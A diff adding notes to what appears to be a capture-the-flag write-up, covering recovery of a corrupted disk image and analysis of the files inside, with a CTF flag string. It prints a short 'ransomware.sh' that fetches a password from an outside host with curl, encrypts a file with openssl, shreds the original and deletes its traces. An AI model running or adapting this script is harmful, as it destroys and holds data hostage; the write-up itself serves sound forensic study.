@@ -79,6 +79,30 @@ Extracted file: corp_net2.pcap
 
 Extracted file: disk1.img.gz
 
+## File disk1.img.gz
+
+It was corrupted, but using [[Pen testing tools#Gzrecover|gzrecover]] and then [[Pen testing tools#TestDisk|testDisk]] I was able to extract 4 files.
+1. secret
+2. secret.encrypted
+3. sslkeylogfile
+4. ransomware.sh
+After inspecting the files I found that sslkeylogfile contained some ssl keys for TLS 1.3.
+Ransomware.sh contained a shell script that encrypted secret using -aes-128-cbc cipher with [[Pen testing tools#Openssl|openssl]], outputting the secret.encrypt file and then shredded the secret file with 'shred' command before removing it and the sslkeylogfile.
+### ransomware.sh
+`#!/bin/bash 
+`password=$(SSLKEYLOGFILE=sslkeylogfile curl --insecure https://whatyoulookingat.com/1.txt)
+`openssl enc -aes-128-cbc -pass pass:$password -in secret -out secret.encrypted
+`shred secret
+`rm secret
+`rm sslkeylogfile
+`rm $0
+
+The secret file is probably a lost cause, I will instead focus on cracking the secret.encrypt file since I know aes128 was used and the sslkeylogfile previously extracted is probably going to help me decrypt the traffic where the password was obtained from whatyoulookingat.com.
+
+## ransomNote.gz
+
+After neglecting this file I ran gzrecover on it and got a ASCII text file. But the file was unusable, it was a very long file with 
+
 ### FLAGS:
 
 CTF\[E65D46AD10F92508F500944B53168930]
